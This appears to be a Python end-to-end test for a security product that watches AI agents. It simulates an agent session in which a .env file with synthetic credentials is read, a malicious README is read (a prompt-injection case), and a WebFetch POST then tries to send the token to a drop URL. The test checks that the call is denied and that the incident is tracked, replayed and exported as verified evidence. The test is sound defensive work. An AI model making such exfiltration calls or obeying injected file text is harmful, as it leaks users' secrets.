"""Use case 6 — a security investigation with evidence export, end to end through the HTTP API.

The other five product use cases are covered by ``tests/integration/test_ingestion_usecases.py``
(malicious README, malicious website, malicious MCP server, sensitive file exposure, multi-agent
contamination), by ``tests/e2e/test_live_integrations.py`` through the real hook / gateway / SDK
processes, and by the twelve-step workflow. This test follows an analyst from the alert to a closed
incident: triage, observed provenance, replay, a verified evidence bundle, the audit trail of the
export, and resolution. Payloads are the inert Simulation Lab texts; the credential is synthetic.
"""

from __future__ import annotations

import hashlib
import json
import uuid

from fastapi.testclient import TestClient

from app.simulations.payloads import (
    DROP_URL,
    MALICIOUS_README,
    env_file_content,
    synthetic_aws_secret,
    synthetic_github_token,
)
from tests.conftest import OrgCtx
from tests.e2e.flow_support import Flow, ok, tool
from tests.e2e.flow_support import event as _event


def _run(f: Flow, sid: str, name: str, arguments: dict, result: str) -> dict:
    request = tool(sid, name, arguments)
    decision = f.decide(request)
    f.events(
        _event(
            "tool.completed",
            sid,
            tool=request["tool"],
            arguments=arguments,
            correlation_id=request["correlation_id"],
            result=result,
        )
    )
    return decision


def _canonical_sha256(bundle: dict) -> str:
    body = {k: v for k, v in bundle.items() if k != "integrity"}
    return hashlib.sha256(
        json.dumps(body, sort_keys=True, separators=(",", ":"), ensure_ascii=False, allow_nan=False).encode()
    ).hexdigest()


def test_analyst_investigates_an_exfiltration_attempt_and_exports_verified_evidence(
    client: TestClient, seeded_org: OrgCtx, other_org: OrgCtx
) -> None:
    f = Flow(client, seeded_org)
    sid = f"inv-{uuid.uuid4().hex[:8]}"
    token, aws = synthetic_github_token(), synthetic_aws_secret()

    # The incident: a secret enters the session, then injected text, then an exfiltration attempt.
    _run(f, sid, "Read", {"file_path": "/work/payments/.env"}, env_file_content(token, aws))
    _run(f, sid, "Read", {"file_path": "/work/payments/README.md"}, MALICIOUS_README)
    exfil = f.decide(tool(sid, "WebFetch", {"url": DROP_URL, "method": "POST", "body": f"key={token}"}))
    assert exfil["decision"] == "DENY" and exfil["enforcement"] == "enforced"

    # Triage: the navigation badge and the incident queue show it.
    assert f.get("/overview/nav-counts")["open_incidents"] == 1
    (summary,) = f.get("/incidents", status="open")["items"]
    incident_id = summary["id"]
    assert summary["severity"] == "critical"
    incident = f.get(f"/incidents/{incident_id}")
    categories = {x["category"] for x in incident["findings"]}
    assert "exfiltration" in categories, categories
    f.patch(f"/incidents/{incident_id}", {"status": "investigating", "assignee_user_id": seeded_org.user_id})

    # Observed provenance around the exfiltration finding: relationships, explicitly not causation.
    exfil_finding = next(x for x in incident["findings"] if x["category"] == "exfiltration")
    graph = f.get("/provenance/graph", finding_id=exfil_finding["id"], depth=3)
    assert "caus" in graph["disclaimer"].lower()
    relations = {e["relation"] for e in graph["edges"]}
    assert relations and all(e["confidence"] in ("observed", "inferred") for e in graph["edges"])
    session_id = next(n["ref_id"] for n in graph["nodes"] if n["type"] == "session")

    # Replay: what the agent did, in order, with the recorded outcomes.
    steps = f.get(f"/replay/sessions/{session_id}")["steps"]
    assert [s["outcome"]["decision"] for s in steps if (s.get("outcome") or {}).get("decision")] == [
        "AUDIT",
        "ALLOW",
        "DENY",
    ]

    # Notes are redacted; the evidence bundle verifies and is itself audited.
    f.post(f"/incidents/{incident_id}/notes", {"body": f"Confirmed: the denied call carried {token}."}, 201)
    response = client.get(f"/api/v1/incidents/{incident_id}/export", headers=seeded_org.user_headers)
    bundle = ok(response)
    assert "attachment" in response.headers["content-disposition"]
    assert bundle["integrity"]["sha256"] == _canonical_sha256(bundle)
    assert bundle["audit_chain_verification"]["valid"] is True
    receipts = bundle["context_receipts"]
    assert len(receipts) >= 2 and all(r["signature_valid"] for r in receipts)
    assert any(d["decision"] == "DENY" and d["input_snapshot"] for d in bundle["policy_decisions"])
    assert "causation" in " ".join(bundle["attestation"]["limits"])
    for secret in (token, aws):
        assert secret not in response.text
    exported = f.get("/audit", action="incident.exported", target_id=incident_id)["items"]
    assert [e["details"]["sha256"] for e in exported] == [bundle["integrity"]["sha256"]]
    assert f.get("/audit/verify")["valid"] is True

    # Another organisation sees none of it.
    for path in (
        f"/incidents/{incident_id}",
        f"/incidents/{incident_id}/export",
        f"/replay/sessions/{session_id}",
    ):
        assert client.get(f"/api/v1{path}", headers=other_org.user_headers).status_code == 404
    assert client.get("/api/v1/incidents", headers=other_org.user_headers).json()["total"] == 0

    # Close the investigation.
    closed = f.patch(
        f"/incidents/{incident_id}",
        {"status": "resolved", "resolution": "Token rotated; README fixed upstream."},
    )
    assert closed["status"] == "resolved" and closed["resolved_at"]
    assert f.get("/overview/nav-counts")["open_incidents"] == 0
